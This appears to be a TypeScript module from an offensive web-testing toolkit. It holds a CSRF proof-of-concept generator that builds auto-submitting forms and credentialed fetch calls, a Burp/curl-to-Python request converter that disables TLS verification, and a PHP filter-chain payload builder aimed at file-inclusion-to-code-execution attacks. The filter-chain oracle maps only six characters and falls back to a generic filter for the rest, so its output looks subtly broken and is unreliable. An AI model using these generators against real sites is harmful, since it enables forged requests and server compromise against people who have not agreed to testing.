
/**
 * CSRF Generator Logic
 */
export const generateCSRFPoC = (rawRequest: string, autoSubmit: boolean, type: 'form' | 'fetch' = 'form') => {
  const parts = rawRequest.split('\n\n');
  const headersPart = parts[0];
  const bodyPart = parts[1] || '';

  const headerLines = headersPart.split('\n');
  const firstLine = headerLines[0].split(' ');
  const method = firstLine[0] || 'POST';
  const path = firstLine[1] || '/';

  const hostHeader = headerLines.find(l => l.toLowerCase().startsWith('host: '));
  const host = hostHeader ? hostHeader.split(': ')[1].trim() : 'localhost';
  const url = `http://${host}${path}`;

  if (type === 'fetch') {
    // Fetch API PoC
    let fetchOptions: any = {
      method: method,
      mode: 'cors',
      credentials: 'include',
    };

    // Try to parse body
    if (bodyPart.trim()) {
      fetchOptions.body = bodyPart.trim();
      // Add content-type if detected
      if (bodyPart.trim().startsWith('{')) {
        fetchOptions.headers = { 'Content-Type': 'application/json' };
      } else if (bodyPart.includes('=')) {
        fetchOptions.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
      }
    }

    return `<html>
  <body>
    <script>
      fetch('${url}', ${JSON.stringify(fetchOptions, null, 2)})
        .then(response => response.text())
        .then(data => console.log(data))
        .catch(error => console.error(error));
    </script>
    <h1>CSRF PoC Initiated (Check Console)</h1>
  </body>
</html>`;
  }

  // classic Form PoC
  let params: { [key: string]: string } = {};

  if (bodyPart.includes('=') && !bodyPart.trim().startsWith('{')) {
    // Form encoded
    bodyPart.split('&').forEach(p => {
      const [k, v] = p.split('=');
      if (k) params[decodeURIComponent(k)] = decodeURIComponent(v || '');
    });
  } else if (bodyPart.trim().startsWith('{')) {
    // JSON attempt conversion to hidden inputs (flawed for strict JSON APIs but standard for this technique)
    try {
      const parsed = JSON.parse(bodyPart);
      Object.keys(parsed).forEach(k => params[k] = typeof parsed[k] === 'object' ? JSON.stringify(parsed[k]) : parsed[k]);
    } catch (e) {
      console.error("JSON parse failed for body");
    }
  }

  const inputs = Object.entries(params)
    .map(([k, v]) => `    <input type="hidden" name="${k}" value='${String(v).replace(/'/g, "&#39;")}' />`)
    .join('\n');

  return `<html>
  <body onload="${autoSubmit ? 'document.forms[0].submit()' : ''}">
    <form action="${url}" method="${method}">
${inputs}
      <input type="submit" value="Submit Request" />
    </form>
    ${autoSubmit ? '<script>document.forms[0].submit();</script>' : ''}
  </body>
</html>`;
};

/**
 * Burp-to-Python Converter Logic
 */
const NOISE_HEADERS = new Set([
  'host', 'user-agent', 'accept', 'accept-language', 'accept-encoding',
  'content-length', 'origin', 'dnt', 'sec-gpc', 'connection',
  'referer', 'x-requested-with',
]);

// When parametrize=true, these header patterns get replaced with Python variables.
const AUTH_PATTERNS: Array<{ test: (name: string, value: string) => boolean; varName: string; pyValue: (v: string) => string }> = [
  { test: (n) => /csrf/i.test(n),                          varName: 'csrf',       pyValue: () => 'csrf' },
  { test: (n, v) => n.toLowerCase() === 'authorization' && /^bearer /i.test(v),
                                                            varName: 'token',      pyValue: () => "f'Bearer {token}'" },
  { test: (n, v) => n.toLowerCase() === 'authorization' && /^basic /i.test(v),
                                                            varName: 'credentials', pyValue: () => "f'Basic {credentials}'" },
  { test: (n, v) => n.toLowerCase() === 'authorization' && /^token /i.test(v),
                                                            varName: 'token',      pyValue: () => "f'Token {token}'" },
  { test: (n) => n.toLowerCase() === 'authorization',      varName: 'token',      pyValue: () => 'token' },
  { test: (n) => /^(x-auth-token|x-access-token|x-id-token|x-token)$/i.test(n),
                                                            varName: 'token',      pyValue: () => 'token' },
  { test: (n) => /^(x-api-key|api-key|apikey|x-api-token)$/i.test(n),
                                                            varName: 'api_key',    pyValue: () => 'api_key' },
  { test: (n) => /^(x-session-token|x-session-id)$/i.test(n),
                                                            varName: 'session_token', pyValue: () => 'session_token' },
];

interface ParsedRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: string | null;
}

interface ConvertOptions {
  mode: 'inline' | 'function';
  caller: 'session' | 'requests';
  parametrize?: boolean;
}

function tokenizeCurl(cmd: string): string[] {
  const normalized = cmd.replace(/\\\n/g, ' ');
  const tokens: string[] = [];
  let current = '';
  let inSingle = false;
  let inAnsiC = false; // inside $'...' — backslash sequences are active
  let inDouble = false;
  for (let i = 0; i < normalized.length; i++) {
    const ch = normalized[i];
    if (ch === '$' && !inSingle && !inDouble && normalized[i + 1] === "'") {
      i++;
      inSingle = true;
      inAnsiC = true;
      continue;
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      if (!inSingle) inAnsiC = false;
    } else if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
    } else if (ch === '\\' && i + 1 < normalized.length && (inAnsiC || (!inSingle && !inDouble))) {
      const nx = normalized[++i];
      if (inAnsiC) {
        // ANSI-C escape sequences: \n \t \r \\ \' \"
        if      (nx === 'n')  current += '\n';
        else if (nx === 't')  current += '\t';
        else if (nx === 'r')  current += '\r';
        else if (nx === '\\') current += '\\';
        else if (nx === "'")  current += "'";
        else if (nx === '"')  current += '"';
        else { current += '\\'; current += nx; }
      } else {
        current += nx;
      }
    } else if (/\s/.test(ch) && !inSingle && !inDouble) {
      if (current) { tokens.push(current); current = ''; }
    } else {
      current += ch;
    }
  }
  if (current) tokens.push(current);
  return tokens;
}

function parseCurlRequest(raw: string): ParsedRequest {
  const tokens = tokenizeCurl(raw);
  const result: ParsedRequest = { method: 'GET', url: '', headers: {}, body: null };
  const bodyParts: string[] = [];
  let i = 1;
  while (i < tokens.length) {
    const tok = tokens[i];
    if ((tok === '-X' || tok === '--request') && i + 1 < tokens.length) {
      result.method = tokens[++i];
    } else if ((tok === '-H' || tok === '--header') && i + 1 < tokens.length) {
      const h = tokens[++i];
      const ci = h.indexOf(': ');
      if (ci > -1) result.headers[h.substring(0, ci)] = h.substring(ci + 2);
    } else if ((tok === '-d' || tok === '--data' || tok === '--data-raw' ||
                tok === '--data-binary') && i + 1 < tokens.length) {
      bodyParts.push(tokens[++i]);
      if (result.method === 'GET') result.method = 'POST';
    } else if (tok === '--data-urlencode' && i + 1 < tokens.length) {
      bodyParts.push(decodeURIComponent(tokens[++i]));
      if (result.method === 'GET') result.method = 'POST';
    } else if ((tok === '-u' || tok === '--user' ||
                tok === '-o' || tok === '--output' ||
                tok === '--proxy' || tok === '-A' || tok === '--user-agent' ||
                tok === '--connect-timeout' || tok === '--max-time') && i + 1 < tokens.length) {
      i++; // skip argument — handled by session or irrelevant
    } else if ((tok === '-b' || tok === '--cookie') && i + 1 < tokens.length) {
      result.headers['Cookie'] = tokens[++i];
    } else if (tok.startsWith('-')) {
      // skip other flags (--compressed, --insecure, -k, -L, --silent, -s, etc.)
    } else {
      result.url = tok.replace(/^['"]|['"]$/g, '');
    }
    i++;
  }
  if (bodyParts.length > 0) result.body = bodyParts.join('&');
  return result;
}

function parseRawHttp(raw: string): ParsedRequest {
  const [headersPart, ...bodyParts] = raw.split(/\r?\n\r?\n/);
  const body = bodyParts.join('\n\n').trim() || null;
  const lines = headersPart.split(/\r?\n/);
  const parts = (lines[0] || '').split(' ');
  const method = parts[0] || 'GET';
  const path = parts[1] || '/';
  const headers: Record<string, string> = {};
  for (const line of lines.slice(1)) {
    const ci = line.indexOf(': ');
    if (ci > -1) headers[line.substring(0, ci)] = line.substring(ci + 2).trim();
  }
  const host = headers['Host'] || headers['host'] || 'TARGET';
  const proto = (headers['X-Forwarded-Proto'] || headers['x-forwarded-proto'] || 'http').toLowerCase();
  const useHttps = proto === 'https' || (host.includes(':443'));
  return { method, url: `${useHttps ? 'https' : 'http'}://${host}${path}`, headers, body };
}

function pyStr(s: string): string {
  const esc = s
    .replace(/\\/g, '\\\\')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
  return esc.includes("'") ? `"${esc.replace(/"/g, '\\"')}"` : `'${esc}'`;
}

const LINE_WIDTH = 100;

function pyDict(entries: Array<[string, string]>, indent: string): string {
  if (entries.length === 0) return '{}';
  const inner = indent + '    ';
  const pairs = entries.map(([k, v]) => `${pyStr(k)}: ${v}`);
  const compact = `{ ${pairs.join(', ')} }`;
  const anyLongValue = entries.some(([, v]) => v.length > 60);
  if (compact.length <= LINE_WIDTH && !anyLongValue) return compact;
  const lines = entries.map(([k, v]) => `${inner}${pyStr(k)}: ${v}`);
  return `{\n${lines.join(',\n')},\n${indent}}`;
}

function pyVal(v: unknown, indent: string): string {
  if (typeof v === 'string') return pyStr(v);
  if (v === null || v === undefined) return 'None';
  if (typeof v === 'boolean') return v ? 'True' : 'False';
  if (typeof v === 'number') return String(v);
  if (Array.isArray(v)) {
    if (v.length === 0) return '[]';
    const inner = indent + '    ';
    const items = v.map(item => `${inner}${pyVal(item, inner)}`);
    return `[\n${items.join(',\n')},\n${indent}]`;
  }
  if (typeof v === 'object') {
    const entries = Object.entries(v as Record<string, unknown>).map(([k, val]) =>
      [k, pyVal(val, indent + '    ')] as [string, string]
    );
    return pyDict(entries, indent);
  }
  return String(v);
}

function bodyToDict(body: string, argsIndent: string): string {
  if (body.includes('=') && !body.trim().startsWith('{')) {
    try {
      const pairs = body.split('&').map(p => {
        const eq = p.indexOf('=');
        return eq === -1
          ? [decodeURIComponent(p), '']
          : [decodeURIComponent(p.substring(0, eq)), decodeURIComponent(p.substring(eq + 1))];
      });
      const entries = pairs.map(([k, v]) => {
        if ((v.startsWith('{') || v.startsWith('[')) && v.length > 2) {
          try {
            JSON.parse(v);
            return [k, `json.dumps(${v})`] as [string, string];
          } catch { /* not JSON */ }
        }
        return [k, pyStr(v)] as [string, string];
      });
      // Use urllib.parse.urlencode with quote_via=urllib.parse.quote to
      // encode spaces as %20 instead of + (some servers need this).
      return `urllib.parse.urlencode(${pyDict(entries, argsIndent)}, quote_via=urllib.parse.quote)`;
    } catch { /**/ }
  }
  if (body.trim().startsWith('{') || body.trim().startsWith('[')) {
    try {
      const parsed = JSON.parse(body);
      return pyVal(parsed, argsIndent);
    } catch { /**/ }
  }
  return pyStr(body);
}

export const convertBurpRequest = (input: string, opts: ConvertOptions): string => {
  if (!input.trim()) return '';
  const { mode, caller, parametrize = false } = opts;
  const useSession = caller === 'session';
  let parsed: ParsedRequest;
  try {
    parsed = input.trim().startsWith('curl ') ? parseCurlRequest(input) : parseRawHttp(input);
  } catch (e) {
    return `# Parse error: ${e}`;
  }

  const rawUrl = parsed.url.replace(/^https?:\/\/[^/]+/, '{TARGET}');
  const [urlPath, queryString] = rawUrl.split('?');
  const url = urlPath;
  const method = parsed.method.toLowerCase();

  // Parse query params
  let queryParams: Array<[string, string]> | null = null;
  if (queryString) {
    try {
      queryParams = queryString.split('&').map(p => {
        const eq = p.indexOf('=');
        return eq === -1
          ? [decodeURIComponent(p), ''] as [string, string]
          : [decodeURIComponent(p.substring(0, eq)), decodeURIComponent(p.substring(eq + 1))] as [string, string];
      });
    } catch { /**/ }
  }

  // Split headers into: kept headers, cookies, and parametrize candidates
  const keptHeaders: Array<[string, string, string | null]> = []; // [name, value, pythonExpr | null]
  let cookiePairs: Array<[string, string]> | null = null;
  const paramVars: string[] = [];

  for (const [k, v] of Object.entries(parsed.headers)) {
    if (NOISE_HEADERS.has(k.toLowerCase())) continue;
    if (!v.trim()) continue;

    // Cookies handled separately
    if (k.toLowerCase() === 'cookie') {
      cookiePairs = v.split(/;\s*/).map(p => {
        const eq = p.indexOf('=');
        return eq === -1 ? [p, ''] : [p.substring(0, eq), p.substring(eq + 1)];
      });
      if (parametrize) {
        if (!paramVars.includes('session_cookies')) paramVars.push('session_cookies');
      }
      continue;
    }

    // Check auth patterns for parametrization
    if (parametrize) {
      const match = AUTH_PATTERNS.find(p => p.test(k, v));
      if (match) {
        if (!paramVars.includes(match.varName)) paramVars.push(match.varName);
        keptHeaders.push([k, v, match.pyValue(v)]);
        continue;
      }
    }

    keptHeaders.push([k, v, null]);
  }

  // Build output
  const baseIndent = mode === 'function' ? '    ' : '';
  const argIndent = baseIndent + '    ';
  const entryIndent = argIndent + '    ';

  const lines: string[] = [];

  if (mode === 'function') {
    const funcArgs = parametrize ? [...(useSession ? [caller] : []), ...paramVars].join(', ')
                                 : useSession ? caller : '';
    lines.push(`def do_request(${funcArgs}):`);
  } else if (parametrize) {
    const requiresVars = useSession ? [caller, ...paramVars] : paramVars;
    if (requiresVars.length > 0) lines.push(`# requires: ${requiresVars.join(', ')}`);
  }

  // Add import for form-encoded bodies
  const isFormEncoded = parsed.body && parsed.body.includes('=') && !parsed.body.trim().startsWith('{') && !parsed.body.trim().startsWith('[');
  if (isFormEncoded) lines.push(`${baseIndent}import urllib.parse`);

  lines.push(`${baseIndent}r = ${caller}.${method}(`);
  lines.push(`${argIndent}f"${url}",`);

  if (queryParams && queryParams.length > 0) {
    const entries = queryParams.map(([k, v]) => [k, pyStr(v)] as [string, string]);
    lines.push(`${argIndent}params=${pyDict(entries, argIndent)},`);
  }

  if (keptHeaders.length > 0) {
    const entries = keptHeaders.map(([k, v, pyExpr]) => [k, pyExpr ?? pyStr(v)] as [string, string]);
    lines.push(`${argIndent}headers=${pyDict(entries, argIndent)},`);
  }

  // Cookies: emit dict in requests mode, skip in session mode (session handles them)
  if (cookiePairs && cookiePairs.length > 0 && !useSession) {
    if (parametrize) {
      lines.push(`${argIndent}cookies=session_cookies,`);
    } else {
      const entries = cookiePairs.map(([k, v]) => [k, pyStr(v)] as [string, string]);
      lines.push(`${argIndent}cookies=${pyDict(entries, argIndent)},`);
    }
  }

  if (parsed.body) {
    const isJson = parsed.body.trim().startsWith('{') || parsed.body.trim().startsWith('[');
    const bodyParam = isJson ? 'json' : 'data';
    lines.push(`${argIndent}${bodyParam}=${bodyToDict(parsed.body, argIndent)},`);
  }
  lines.push(`${argIndent}verify=False,`);
  lines.push(`${baseIndent})`);

  if (mode === 'function') lines.push(`    return r`);

  return lines.join('\n');
};

/**
 * PHP Filter Chain Logic
 */
export const generatePHPFilterChain = (payload: string) => {
  const b64 = btoa(payload).replace(/=/g, '');

  // Expanded Oracle
  const oracle: Record<string, string> = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1161|convert.iconv.CP9066.UCS2',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.ISO10646-1.UCS-2',
    'B': 'convert.iconv.ISO8859-1.UTF-16BE|convert.iconv.ISO-10646-UCS-4',
    'C': 'convert.iconv.IBM866.UTF-16|convert.iconv.ISO-10646-UCS-4',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
  };

  let chain = 'php://filter/read=convert.base64-encode';
  for (let i = b64.length - 1; i >= 0; i--) {
    const char = b64[i];
    const filter = oracle[char] || 'convert.iconv.UTF8.UTF7';
    chain += `|${filter}|convert.base64-decode|convert.base64-encode`;
  }
  return chain + '/resource=php://temp';
};
